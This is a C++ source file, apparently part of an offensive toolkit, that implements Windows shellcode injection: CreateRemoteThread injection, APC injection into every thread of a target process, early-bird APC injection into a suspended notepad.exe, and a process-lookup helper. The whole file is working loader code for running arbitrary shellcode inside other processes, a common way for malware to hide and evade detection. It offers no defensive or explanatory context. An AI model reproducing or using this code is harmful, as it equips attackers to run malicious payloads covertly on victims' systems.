// pretty messy code, decent injection

#include "injection.h"
bool injection::createremote(DWORD pid, std::vector<BYTE> shellcode) {
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hprocess) return false;
    LPVOID remotealloc = VirtualAllocEx(hprocess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotealloc) { CloseHandle(hprocess); return false; }
    SIZE_T written;
    if (!WriteProcessMemory(hprocess, remotealloc, shellcode.data(), shellcode.size(), &written)) {
        VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE); CloseHandle(hprocess); return false;
    }
    HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)remotealloc, NULL, 0, NULL);
    if (!hthread) {
        VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE); CloseHandle(hprocess); return false;
    }
    WaitForSingleObject(hthread, INFINITE);
    CloseHandle(hthread);
    VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE);
    CloseHandle(hprocess);
    return true;
}
bool injection::apcinject(DWORD pid, std::vector<BYTE> shellcode) {
    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hprocess) return false;
    LPVOID remotealloc = VirtualAllocEx(hprocess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotealloc) { CloseHandle(hprocess); return false; }
    SIZE_T written;
    if (!WriteProcessMemory(hprocess, remotealloc, shellcode.data(), shellcode.size(), &written)) {
        VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE); CloseHandle(hprocess); return false;
    }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE); CloseHandle(hprocess); return false;
    }
    THREADENTRY32 te; te.dwSize = sizeof(te);
    bool success = false;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hthread) {
                    QueueUserAPC((PAPCFUNC)remotealloc, hthread, (ULONG_PTR)remotealloc);
                    CloseHandle(hthread);
                    success = true;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    Sleep(1000);
    VirtualFreeEx(hprocess, remotealloc, 0, MEM_RELEASE);
    CloseHandle(hprocess);
    return success;
}
bool injection::earlybird(std::vector<BYTE> shellcode) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(NULL, (LPWSTR)L"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return false;
    LPVOID remotealloc = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remotealloc) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return false; }
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remotealloc, shellcode.data(), shellcode.size(), &written)) {
        VirtualFreeEx(pi.hProcess, remotealloc, 0, MEM_RELEASE); TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return false;
    }
    QueueUserAPC((PAPCFUNC)remotealloc, pi.hThread, (ULONG_PTR)remotealloc);
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, 5000);
    VirtualFreeEx(pi.hProcess, remotealloc, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}
DWORD injection::findprocess(std::wstring procname) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    if (!Process32FirstW(snap, &pe)) { CloseHandle(snap); return 0; }
    do {
        if (_wcsicmp(pe.szExeFile, procname.c_str()) == 0) { CloseHandle(snap); return pe.th32ProcessID; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}